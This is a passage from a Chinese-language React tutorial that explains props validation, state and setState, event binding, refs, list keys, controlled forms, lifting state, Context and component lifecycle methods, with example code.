arr=[1,2];console.log([...arr])，生成了一个新数组。而展开运算符不可以单独用在对象上，用在对象只能搭配{}来用，例如const obj={a:'a'};console.log({...obj})（生成新对象），去掉这个{}就会报错。况且React的{...params}中的{}是jsx里的分隔符用于承载js表达式，至于...params表达式是React提供的语法糖，将params的每个属性以及属性值按照组件props方式传递过去了，放到了子组件的props对应同名属性上了。\n\n我们可以为子组件的props属性加上“类型”、“必要性”和“默认值”等设置。用到的是import PropTypes from 'prop-types'这个包，具体写法如下\n\nconst person = {\n  name: '张三',\n  speak: () =>{\n    console.log('speak');\n  }\n}\nfunction App(props) {\n  return (\n    <div className=\"App\">\n      <span>{props.name}</span>\n      <span>{props.age}</span>\n      <span>{props.sex}</span>\n      <span>{props.speak()}</span>\n    </div>\n  );\n}\nApp.propTypes = {\n  name: PropTypes.string.isRequired, // 类型和必要性\n  age: PropTypes.number,\n  sex: PropTypes.string,\n  speak:PropTypes.func // 函数就要特别注意，是func\n}\nApp.defaultProps = { // 设置默认值\n  sex: '男',\n  age: 18\n}\nReactDOM.render(\n  <React.StrictMode>\n    <App {...person}/>\n  </React.StrictMode>,\n  document.getElementById('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n上面用的是函数式组件，如果用类组件，可以将propTypes和defaultProps移到class内部（函数式组件只能放在function外部），使用static关键字即可。\n\nclass App extends React.Component {\n  constructor(props) {\n    super(props)\n  }\n  // 固定的属性名propTypes\n  static propTypes = {\n    name: PropTypes.string.isRequired, // 类型和必要性\n    age: PropTypes.number,\n    sex: PropTypes.string,\n    speak:PropTypes.func // 函数就要特别注意，是func\n  }\n  // 固定的属性名defaultProps\n  static defaultProps = { // 设置默认值\n    sex: '男',\n    age: 18\n  }\n  render() {\n    return (\n      <div className=\"App\">\n        <span>{props.name}</span>\n        <span>{props.age}</span>\n        <span>{props.sex}</span>\n        <span>{props.speak()}</span>\n      </div>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 2.3 组件的state\n\n可以回过头再看一下渲染React元素中那个时钟例子，其实可以使用props进行改造，只要每秒更改传入组件的props，把props里的秒值显示在组件上就可以了，但是它并没有解决ReactDOM.render()多次调用的问题，每秒重新调用这个函数是比较夸张的。\n\n其实呢，使用state来改造是最恰当的，因为state是组件内部状态存储的变量，组件内部的变化优先使用内部的state，除非组件确实受外部控制才使用props。（state是类组件实例上的，函数组件的this是undefined，函数组件可以通过hooks来使用state）\n\n使用state时要注意的点，state是不能随意改变的，比如this.state.xxx = ''这样是不允许的（可在构造函数中赋值），只能使用this.setState({xxx: ''})来改变state上属性的值（浅合并），而且使用setState()这个方法还会重新触发组件的渲染，其实就是告诉浏览器我的组件内部状态改变了需要重新渲染。\n\nindex.tsx\n\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport App from './App';\n\nReactDOM.render(\n  <App />,\n  document.getElementById('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nApp.tsx\n\nimport React, { Fragment, Component } from 'react';\n\nclass App extends Component<any, { date: Date }> {\n  constructor(props: any) {\n    super(props);\n    this.state = { date: new Date() };\n    setInterval(() => {\n      this.setState({\n        date: new Date()\n      });\n    }, 1000);\n  }\n  render() {\n    return (\n      <Fragment>{this.state.date.toLocaleString()}</Fragment>\n    );\n  }\n}\n\nexport default App;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n上面这个改造后的例子是用ts编写的，要注意的是constructor()函数的入参props是外部传来的也要传给React.Component也就是super(props)，还有就是constructor()函数是唯一一个可以给state赋值（初始化）的地方（其他地方只能使用setState()来更改）。\n\nsetState()是浅合并（不是完全覆盖），意思是this.state里有多个属性时，调用setState()去更改一个属性，其他属性还会保持原有的值。\n\nconstructor(props) {\n  super(props);\n  this.state = {\n    posts: [],\n    comments: []\n  };\n}\n\nxxx(response) {\n  // 调用时，只会更改posts的值并不会影响comments的值\n  this.setState({\n    posts: response.posts\n  });\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nstate的更新是异步的。React会优化state更新执行的时机，也就是说会将多个setState()合并成一个。如果你在一个setState()中要读取上一state的值，直接使用this.state的话可能拿不到正确的值。React为我们解决了这个问题，setState()的入参可以是一个函数（前面例子都是一个对象），这个函数的入参是真正上一个state（还有另一个入参props）。\n\n// 有问题，因为 this.props 和 this.state 可能会异步更新\nthis.setState({\n  counter: this.state.counter + this.props.increment,\n});\n\n// 使用函数，state就是之前的this.state对象\nthis.setState(function(state, props) {\n  return {\n    counter: state.counter + props.increment\n  };\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n虽然解决了多个setState()的问题，但是我就是要在某个setState()后面获取当前处理后的this.state的值（不是获取上一个了），也是有办法的，setState()的第二个参数就是回调函数。\n\nthis.setState(function(state, props) {\n  // 上一个state的值（当前这个setState()处理前的state）\n  return {\n    counter: state.counter + props.increment\n  };\n}, () => {\n  // 回调函数里可以获取当前处理后的this.state（当前这个setState()处理后的state）\n  console.log('this.state', this.state);\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n最后明确一点，上面的state的使用都依托于类组件，意思要通过this.的形式来访问。函数式组件的this是undefined，所以它没法正常使用state，但不用担心，在后面的hooks章节里可以通过钩子手段来使用stata。\n\n\n# 2.4 数据流是单向的\n\n可以看下面这个例子，FormattedDate组件调用处的data属性值可以是的父组件的state部分值或者props部分值或者自定义的new Date()，而FormattedDate组件定义处的（子组件内部）props只知道有data这个属性，并不知道数据是属于调用处的state还是props还是自定义的。反过来子组件的数据并不会影响父组件，所以说它们的数据流向都是从上到下这样的一种单向的方式（不允许在子组件里修改props）。\n\n// date的值可以是自身的state里的值，也可以是props，也可以new Date()\n<FormattedDate date={this.state.date} />\n\n// 定义处\nfunction FormattedDate(props) {\n  return <h2>It is {props.date.toLocaleTimeString()}.</h2>;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 2.5 事件处理\n\nreact中事件名属于jsx属性，需要使用首字母小写的驼峰命名法，事件的值一般都是表达式，所以和jsx属性的表达式方式一样使用{}来承载。在处理默认行为时，react不能通过return false来阻止，只能通过e.preventDefault()来阻止\n\nfunction ActionLink() {\n  function handleClick(e) {\n    // react只能通过它来阻止默认行为\n    e.preventDefault();\n    console.log('The link was clicked.');\n  }\n  return (\n    // onClick是首字母小写的驼峰命名法，{handleClick}是jsx属性常见的表达式方式\n    <a href=\"#\" onClick={handleClick}>\n      Click me\n    </a>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n上面例子中的e是React按照W3C规范合成的一个事件，与原生的几乎没有什么差别（可以通过e.nativeEvent访问原生的事件），不必担心浏览器兼容问题。可以不用在js中单独使用addEventListener来添加监听，直接在使用组件时在属性位置上添加事件名和对应的回调即可。说点题外话，e.currentTarget是事件绑定所在的元素，e.target是触发事件的元素（可以是前者的子元素）。\n\n如果使用React组件是类组件，事件的回调函数一般需要事先绑定一下组件的this。如果不这样处理，事件的回调函数的this会指向undefined，因为事件回调函数是被系统事件处理机制调用的，this预期会指向Window，但由于class内部是严格模式不允许直接指向Window所以就指向了undefined。\n\n像上面例子中的handleClick里面没有用到this，所以没有遇到这些问题。可一旦我们需要使用到类组件中的stata或者setState等，它就需要处理this了，具体处理方式如下。\n\n * 方式一（不推荐），onClick={() => this.handleClick()}，不太推荐用额外的箭头函数包裹的这种方法，这种会在每次调用时都会创建不同的回调函数比较耗性能（以前是原型上的函数，大家共用一个，现在每次都新建了箭头函数）。\n * 方式二（常用），声明一个箭头函数，然后赋给成员变量handleClick，因为箭头函数本身没有this，那么在箭头函数里面使用的this其实是它所在的Class的this，也就指向了类组件实例。\n * 方式三（常用），在constructor()里使用bind让回调函数绑定React组件的this，并将回调函数进行重新赋值（bind绑定了this会返回绑定后的新函数，后面要用()进行调用执行；而call和apply并不会返回新函数，它两是立即执行）。\n\n// 方式一，不推荐，每次回调都会生成新的箭头函数，性能不好\nclass Toggle extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {isToggleOn: true};\n  }\n  handleClick() {\n    this.setState(state => ({\n      isToggleOn: !state.isToggleOn\n    }));\n  }\n  render() {\n    // 点击事件回调时，是先调用的箭头函数，而箭头函数本身没有this，在箭头函数内部使用this，其实是它外部\n    // 的this，也就是render的this指向类组件实例。然后继续执行handleClick，它内部this也指向了类组件实例\n    return (\n      <button onClick={() => this.handleClick()}>\n        {this.state.isToggleOn ? 'ON' : 'OFF'}\n      </button>\n    );\n  }\n}\n// 方式二，常用\nclass Toggle extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {isToggleOn: true};\n  }\n    // 方式二和方式一很像运用原理是一样的，方式一是handleClick本身是箭头函数，而方式二是用新箭头函数包裹了handleClick\n  handleClick = () => {\n    // 箭头函数虽然本身没有this，但如果在它内部使用了this，那么这个this实际它外部的this，也就指向了类组件实例\n    this.setState(state => ({\n      isToggleOn: !state.isToggleOn\n    }));\n  }\n  render() {\n    return (\n      <button onClick={this.handleClick}>\n        {this.state.isToggleOn ? 'ON' : 'OFF'}\n      </button>\n    );\n  }\n}\n// 方式三，常用\nclass Toggle extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {isToggleOn: true};\n    // 为this.handleClick函数绑定了this（指向类实例），并生成新函数，最后赋值给了this.handleClick\n    this.handleClick = this.handleClick.bind(this);\n  }\n  handleClick() {\n    this.setState(state => ({\n      isToggleOn: !state.isToggleOn\n    }));\n  }\n  render() {\n    return (\n      <button onClick={this.handleClick}>\n        {this.state.isToggleOn ? 'ON' : 'OFF'}\n      </button>\n    );\n  }\n}\nReactDOM.render(\n  <Toggle />,\n  document.getElementById('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\n处理事件事件时可能需要传递参数：\n\n * 方式一（不推荐），多了event和那个自定传参，这个event必须显式传到真正的回调函数里。\n * 方式二，在jsx里直接bind，同时将参数放在后面传过去；\n * 方式三，在jsx标签里新增一个属性，将要传递的参数放在这个属性里，在回调函数里直接使用e.target.xxx就可以获取这个参数了。\n\n// 方式一，绑定this同上面的方式一，那么也就是不常用，每次调用都会创建新箭头函数，影响性能\n<button onClick={(e) => this.deleteRow(id, e)}>Delete Row</button>\n\n// 方式二，常用。可以考虑方式二或者下面的方式三\n<button onClick={this.deleteRow.bind(this, id)}>Delete Row</button>\n\n\n// 方式三，绑定this同上面的方式三，只是传值是使用了节点的额外自定义属性，再通过e.target去拿这个自定义属性\nconstructor() {\n  // 为了在回调中使用 `this`，这个绑定是必不可少的\n  this.handleClick = this.handleClick.bind(this);\n}\nhandleClick(e) {\n  // `e.currentTarget`是事件绑定所在的元素，`e.target`是触发事件的元素（可以是前者的子元素）\n  const id = e.target.id;\n}\nrender() {\n  return <button onClick={this.deleteRow} id={id}>Delete Row</button>\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 2.6 组件的refs\n\n有些场景需要获取到某个节点，在原生js里通常是document.getElementById等。在React里是通过组件的refs来获取某个节点的，但事先通过ref给那个节点打上“标记”。（如果是点击事件获取到点击本身的节点，用event就足够了，没必要用ref，像下面这个场景是获取兄弟节点确实就需要用到ref。原则是能不用ref就不用ref）\n\nclass App extends React.Component {\n  handleClick = ()=> {\n    // 使用时通过this.refs.xxx来读取\n    console.log(this.refs.myMyput.value)\n  }\n  render() {\n    // 使用ref=\"xxx\"给<input>打上标记\n    return (\n      <div className=\"App\">\n        <input ref=\"myMyput\" />\n        <button onClick={this.handleClick}>点击</button>\n      </div>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n上面的ref字符串写法已经被弃用了，推荐使用给ref绑定函数或者React.createRef()的方式来创建ref。\n\nclass App extends React.Component {\n  handleClick = ()=> {\n    console.log(this.myMyputEl.value)\n  }\n  // 提供给<input>的ref，在创建输入框时会调用这个函数，并将输入框以参数形式传递给该函数\n  myMyput = (el) => {\n    this.myMyputEl = el // 用一个属性接收\n  }\n  render() {\n    // 绑定ref绑定一个函数\n    return (\n      <div className=\"App\">\n        <input ref={this.myMyput} />\n        <button onClick={this.handleClick}>点击</button>\n      </div>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n最为推荐的是React.createRef()，创建一个ref容器。\n\nclass App extends React.Component {\n  // 相比于上一种方式，它少了一个myMyputEl。这种方式下，这个element是放在了myMyput的current属性上了\n  myMyput = React.createRef();\n  handleClick = ()=> {\n    // 所以用的时候，就得是this.myMyput.current\n    console.log(this.myMyput.current.value)\n  }\n  render() {\n    return (\n      <div className=\"App\">\n        <input ref={this.myMyput} />\n        <button onClick={this.handleClick}>点击</button>\n      </div>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n说点题外话，看上面的代码，类组件没有用到constructor，如果在构造函数里没有用到this.props是可以省略掉constructor以及它的super，props照样能接受到值的。至于state和事件回调函数是可以写成class的成员属性的。但是，如果你没有省略构造函数，那么constructor(props){}函数体里的super(props)就不能省略props，如果super(props)省略成super()这个样子，会出现一个bug，那就是你的this.props可能是个undefined（意味着没有构造props这个属性）。总的来说就是，要省略就把constructor和super都省略，要么都保留。\n\n\n# 四、key的作用/表单的使用\n\n\n# 4.1 key怎么用以及为什么用\n\n在前面的【条件、列表渲染】那节里说个列表渲染了。如果不加上key属性，在运行后会报错a key should be provided for list items，意思是当你创建一个元素时，必须包括一个特殊的key属性。key可以取item的toString之后的值，也可以取索引值index，但最正确做法应该是取唯一的id值。\n\nfunction NumberList(props) {\n  const numbers = props.numbers;\n  const listItems = numbers.map((number) =>\n    <li key={number.toString()}>\n      {number}\n    </li>\n  );\n  return (\n    <ul>{listItems}</ul>\n  );\n}\n\nconst numbers = [1, 2, 3, 4, 5];\nReactDOM.render(\n  <NumberList numbers={numbers} />,\n  document.getElementById('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n如果你对li进行了一次提取，将<li>提取成ListItem，那么这个key是放在提取的ListItem上还是放在原本的<li>上？答案就是放在靠近数组的上下文组件里，也就是放在ListItem调用处的标签上。\n\n// 从li提取新组件ListItem\nfunction ListItem(props) {\n  // 这里不需要指定 key：\n  return <li>{props.value}</li>;\n}\n// NumberList组件\nfunction NumberList(props) {\n  const numbers = props.numbers;\n  const listItems = numbers.map((number) =>\n    // 正确！key 应该在数组的上下文中被指定\n    <ListItem key={number.toString()} value={number} />\n  );\n  return (\n    <ul>\n      {listItems}\n    </ul>\n  );\n}\n\nconst numbers = [1, 2, 3, 4, 5];\nReactDOM.render(\n  <NumberList numbers={numbers} />,\n  document.getElementById('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n在上面例子中<ListItem key={number.toString()} value={number} />，这个key只是传给React使用的，ListItem定义处的props只能读取到value，是读取不到key值的，这点要注意。如果你实在想用这些key值，那就使用其他属性名将key赋给这个新属性传过去即可。\n\n前面只是说了怎么用key，那为什么用key呢？原因是React要进行diff比较，让元素进行合适的局部更新，谁与谁比呢？那就是前后相同key的元素去比，帮助React识别哪些元素改变了。比如添加一项时，直接根据它的虚拟元素去渲染真实DOM，因为它拥有一个新key，以前就没有这个key，肯定得重新生成虚拟元素以及真实DOM。（删除也是同样的道理，key都完全没有了，直接删除）\n\n那么不建议用索引作为key你应该好理解了。在添加和删除的时候，列表的索引只是看起来改变了尾上那个，比如索引[0,1,2]变为了[0,1,2,3]，但你能肯定一定是在尾上添加的项吗？这样会导致什么问题呢，那就是一一对应大部分失效了（在添加删除时），大部分项都会重新渲染。比如是在0位置上添加的新项，那么后面的项整体往后挪一个位置，那么它们就每人获得了一个新索引，key自然也是跟着变动了，那么diff比较时是不是每一项都会认为变动了，它们都会重新渲染了，非常浪费性能。总的来说就是索引作为key，添加或删除导致有些项挪动位置从而获得了新key，就导致了没必要的重新渲染。\n\n其实上面还不是很严重的问题，最严重的是渲染错误，比如每项都包含自己的文本节点以及一个Input节点。Input会输入一些值，而在diff时反而不会检测输入的具体值，这会认为Input子节点可以被复用。但是这项本身以及它的文本节点会重新渲染（上面的添加删除场景，因为获得了新索引），这样就导致一些文字好像更新了Input好像是上一项留下来的，效果图如下（新增一项在0位置，正确的是0位置的input应该没有值，其他也不能错位），这种场景的diff与Vue是一样的。\n\n\n\n用唯一的id值作为key就不一样，不管你位置怎么变动，我只找key对应的元素进行前后比较，diff出结果不同才重新渲染（修改场景）。至于添加和删除前面也说过了，新的key以前没有就直接渲染，以前有现在没有就直接删除。\n\n\n# 4.2 表单\n\n在react中，表单的数据源通常保存在组件的state中，再让表单元素的value属性和state关联起来，这样一来表单的显示效果始终由React的state驱动（“唯一数据源”）。再对表单做事件处理，在事件回调函数中使用setState()来更改表单组件的数据源，那么表单显示的值将随着用户输入而更新。\n\nclass NameForm extends React.Component {\n  state = {value: ''};\n  handleChange = (event) => {\n    this.setState({value: event.target.value});\n  }\n  handleSubmit = (event) => {\n    alert('提交的名字: ' + this.state.value);\n    event.preventDefault();\n  }\n  render() {\n    // 受控组件，意思是输入框里的值更新了，也会同步更新到状态state里\n    return (\n      <form onSubmit={this.handleSubmit}>\n        <label>\n          名字:\n          <input type=\"text\" value={this.state.value} onChange={this.handleChange} />\n        </label>\n        <input type=\"submit\" value=\"提交\" />\n      </form>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n<input>、<textarea>和select基本一样，都是value控制着显示效果，事件控制着数据更新。\n\nclass FlavorForm extends React.Component {\n  state = {value: 'coconut'};\n  handleChange = (event) => {\n    this.setState({value: event.target.value});\n  }\n  handleSubmit = (event) => {\n    alert('你喜欢的风味是: ' + this.state.value);\n    event.preventDefault();\n  }\n  render() {\n    // 多选的话可以使用value={['grapefruit', 'lime']}这种字符串数组格式\n    return (\n      <form onSubmit={this.handleSubmit}>\n        <label>\n          选择你喜欢的风味:\n          <select value={this.state.value} onChange={this.handleChange}>\n            <option value=\"grapefruit\">葡萄柚</option>\n            <option value=\"lime\">酸橙</option>\n            <option value=\"coconut\">椰子</option>\n            <option value=\"mango\">芒果</option>\n          </select>\n        </label>\n        <input type=\"submit\" value=\"提交\" />\n      </form>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n如果有多个同类型的表单（不同类型可以通过nodeName等来判断），区分的话要在表单元素上使用name这个属性，并在回调函数中使用event.target.name来区分。例如下方的name=\"isGoing\"和name=\"numberOfGuests\"，在handleInputChange函数中就用event.target.name来区分是哪个input。当然，你也可以用函数柯里化（调用函数，然后返回一个函数，本质是个闭包）来实现多个同类型表单接受各自的值。\n\nrender() {\n  return (\n    // 让多个控件使用同一个handleInputChange，用event.target.name来区分\n    <form>\n      <label>\n        参与:\n        <input\n          name=\"isGoing\"\n          type=\"checkbox\"\n          checked={this.state.isGoing}\n          onChange={this.handleInputChange} />\n      </label>\n      <br />\n      <label>\n        来宾人数:\n        <input\n          name=\"numberOfGuests\"\n          type=\"number\"\n          value={this.state.numberOfGuests}\n          onChange={this.handleInputChange} />\n      </label>\n    </form>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 五、状态提升\n\n当兄弟组件有联动关系时，它们所用的数据来源不会是各自的state（修改自身的state不会影响别的组件），而是存储在父组件的state中。\n\n具体就是，先把数据源存储在父组件的state中，准备渲染时以一定的条件或转换关系分别处理子组件所需的数据和回调函数，再将处理好的内容通过props这种单向通道传递给子组件；在某个子组件变化时，调用父组件传递过来的回调函数，并将新的值通过这个回调函数传递回父组件，然后父组件通过setState()来修改state数据源，最后就是重新渲染所有子组件，这样就达到了子组件间的联动的目的。\n\n多个组件需要反映相同的变化数据，要将共享状态提升到最近的共同父组件中去，我们称这种方式为“状态提升”。下面是状态提升的一个样例，App.tsx和NumberInput.tsx：\n\nApp.tsx\n\nimport React, { Component } from 'react';\nimport NumberInput from './NumberInput';\n\ninterface IData { type: string, value: number | string }\n\nclass App extends Component<any, IData> {\n  constructor(props: any) {\n    super(props);\n    this.handleValue = this.handleValue.bind(this);\n    this.state = { type: 'a', value: 0 };\n  }\n  handleValue(data: IData) {\n    this.setState({ type: data.type, value: data.value });\n  }\n  tryConvert(): number | string {\n    // 为了解决NaN的问题\n    if (typeof this.state.value === 'string') {\n      return '';\n    }\n    switch (this.state.type) {\n      case 'a': // 传进来是a，返回是b类型的值\n        return this.state.value + 12;\n      case 'b':\n        return this.state.value - 12;\n      default:\n        return '';\n    }\n  }\n\n  render() {\n    const type = this.state.type;\n    const value = this.state.value;\n    const aValue = type === 'a' ? value : this.tryConvert();\n    const bValue = type === 'b' ? value : this.tryConvert();\n\n    return (\n      <div>\n        <NumberInput\n          inputType=\"a\"\n          inputValue={aValue}\n          inputHandle={this.handleValue} />\n        <NumberInput\n          inputType=\"b\"\n          inputValue={bValue}\n          inputHandle={this.handleValue} />\n      </div>\n    );\n  }\n}\n\nexport default App;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\nNumberInput.tsx\n\nimport React, { Component } from 'react';\n\ninterface IData { type: string, value: number | string }\ninterface IProps { inputType: string, inputValue: number | string, inputHandle: (data: IData) => void }\n\nclass NumberInput extends Component<IProps, any> {\n    constructor(props: IProps) {\n        super(props);\n        this.handleValue = this.handleValue.bind(this);\n    }\n    handleValue(e: any) {\n        let value: number | string = parseInt(e.target.value);\n        value = isNaN(value) ? '' : value;\n        // 状态提升，使用父组件传过来的value和处理事件，不用自身的state\n        this.props.inputHandle({ type: this.props.inputType, value });\n    }\n    render() {\n        // 状态提升，使用父组件传过来的value和处理事件，不用自身的state\n        return <input value={this.props.inputValue} onChange={this.handleValue} />\n    }\n}\nexport default NumberInput;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 六、Context\n\n前面所用到props一般就用到2-3层，一旦层比较深，就会通过中间元素传递props，这样会不容易维护组件，复用性也会变差。\n\n先在在顶层组件附近使用const MyContext = React.createContext(obj)，给obj对象关联一个Context，然后在顶部组件jsx中使用<MyContext.Provider value={xxx}>对值进行传递，深层的组件不是立即就能用的，需要先导入那个Context对象，然后使用contextType方式或者<MyContext.Consumer>方式进行接收（消费）。\n\nconst defaultContextValue = { userName: '张三'};\n// 这个MyContext不能放在顶层组件内部，必须放在外面，还要export出去供孙组件使用\nexport const MyContext = React.createContext(defaultContextValue);\nexport default class App extends React.Component {\n  render() {\n    // MyContext名字是上面createContext时自定义的，Provider的是固定写法\n    return (\n      <MyContext.Provider value={defaultContextValue}>\n        <TodoComponent/>\n      <MyContext.Provider/>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n在类组件中接受（消费）Context，是通过类的静态属性contextType实现的。\n\n// 这里一定要先导入之前的context对象\nimport { MyContext } from '../TodoItem'\nexport default class TodoItem extends Component {\n    // 静态属性contextType接收MyContext，就能使用this.context了\n    static contextType = MyContext;\n    render() {\n        return (\n          <li>\n              <label>\n                  <input type=\"checkbox\"/>\n                  <span>名称：{this.context.userName}</span>\n              </label>\n              <button className=\"btn btn-danger\" style={{display:'none'}}>删除</button>\n          </li>\n        )\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n如果是函数式组件，那就需要使用<MyContext.Consumer>，其实该方法同样也能用在类组件中，但是类组件contextType方式更方便，但如果是函数组件其实用useContext会更方便，这在后面hooks章节会讲。\n\n// 这里一定要先导入之前的context对象\nimport { MyContext } from '../TodoItem'\nexport default class TodoItem extends Component {\n    render() {\n        // MyContext名字是上面createContext时自定义的，Consumer的是固定写法。\n        // value就是Provider里的value，要写成函数形式再return\n        return (\n          <li>\n              <label>\n                  <input type=\"checkbox\"/>\n                  <MyContext.Consumer>\n                    {value => {\n                      return (\n                        <span>名称：{value.userName}</span>\n                        )\n                    }}\n                  <MyContext.Consumer>\n              </label>\n              <button className=\"btn btn-danger\" style={{display:'none'}}>删除</button>\n          </li>\n        )\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 七、组件的生命周期\n\n组件的生命周期分为三个阶段：\n\n * 挂载时(Mounting)：组件第一次绘制，将会创建虚拟DOM、渲染UI，完成组件的初始化和挂载。\n * 更新时(Updating)：组件运行交互的阶段，可以处理用户的交互、收集监听事件、重新渲染UI。\n * 卸载时(Unmounting)：组件卸载消亡的阶段，会对组件做一些清理工作，删除虚拟DOM、移除UI。\n\n这三个阶段的细节以及常用的生命周期函数如下图：\n\n\n\n\n# constructor()和render()\n\nconstructor()是组件的构造函数，用于初始化组件的数据。一般就是为了给this.state赋值（唯一赋值的地方了），然后就是给处理事件绑定this。还要记得在第一行要加上super(props)，然后不要调用setState()。既然可以赋值给this.state干嘛还要调用setState()。\n\nrender()是React组件必须实现的函数（准备组件渲染所需的UI），它一般返回的就是组件的jsx形式的UI（不渲染就返回null）。我们常常在这个函数里构建组件的模板，返回jsx前也会稍微处理一下数据以方便放入jsx中。但是这个函数里不允许与浏览器进行交互，交互的逻辑放到其他生命周期函数里（事件处理函数最好定义成组件的成员）。\n\n\n# componentDidMount()和componentWillUnmount()\n\ncomponentDidMount()这个生命周期函数会在挂载时的最后一步被调用（其实就是告诉开发已经挂载完了），一些比较依赖挂载后的DOM结构的处理工作会在这个生命周期函数里进行。例如添加订阅和网络请求等。还有比如想知道添加了组件后它所在位置大小等等。\n\ncomponentWillUnmount()这个生命周期函数会在卸载时被调用（在销毁前被调用），一般在这里做一些必要的清理操作。例如取消订阅和网络请求等。\n\n在componentDidMount()中是可以调用setState()的，会触发一次额外的渲染，请谨慎使用因为会用性能问题，请在constructor()里就做好state初始工作。在componentWillUnmount()是不允许调用setState()的，都要卸载销毁了。\n\n我们对组件的state这节的第一个例子进行改造，将定时器的注册放到componentDidMount()，将定时器的注销放到componentWillUnmount()。\n\nimport React, { Fragment, Component } from 'react';\n\nclass App extends Component<any, { date: Date }> {\n  constructor(props: any) {\n    super(props);\n    this.state = { date: new Date() };\n  }\n  componentDidMount() {\n    this.interval = setInterval(() => {\n      this.setState({\n        date: new Date()\n      });\n    }, 1000);\n  }\n  componentWillUnmount() {\n    clearInterval(this.interval);\n  }\n  render() {\n    return (\n      <Fragment>{this.state.date.toLocaleString()}</Fragment>\n    );\n  }\n}\n\nexport default App;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# componentDidUpdate()和getSnapshotBeforeUpdate()\n\ngetSnapshotBeforeUpdate()这个生命周期函数（不常用的生命周期函数）在更新时的渲染输出之前被调用的，它使得组件能在发生更改之前从 DOM 中捕获一些信息（例如，滚动位置），它的返回值将作为componentDidUpdate()的第三个参数“snapshot”。\n\ncomponentDidUpdate()这个生命周期函数是在更新时的最后一步被调用的（其实就是告诉开发已经更新完了）。值得注意的是，首次渲染不会调用它，而是调用componentDidMount()（首次渲染在挂载时）。可以在该生命周期函数里进行DOM操作（UI处理），也可以在一定条件下（对比了前后props）进行网络请求。虽然可以在该生命周期函数使用setState()，但一定要加条件，否则容易死循环，要谨慎。\n\nclass ScrollingList extends React.Component {\n  constructor(props) {\n    super(props);\n    this.listRef = React.createRef();\n  }\n\n  getSnapshotBeforeUpdate(prevProps, prevState) {\n    // 我们是否在 list 中添加新的 items ？\n    // 捕获滚动​​位置以便我们稍后调整滚动位置。\n    if (prevProps.list.length < this.props.list.length) {\n      const list = this.listRef.current;\n      return list.scrollHeight - list.scrollTop;\n    }\n    return null;\n  }\n\n  componentDidUpdate(prevProps, prevState, snapshot) {\n    // 如果我们 snapshot 有值，说明我们刚刚添加了新的 items，\n    // 调整滚动位置使得这些新 items 不会将旧的 items 推出视图。\n    //（这里的 snapshot 是 getSnapshotBeforeUpdate 的返回值）\n    if (snapshot !== null) {\n      const list = 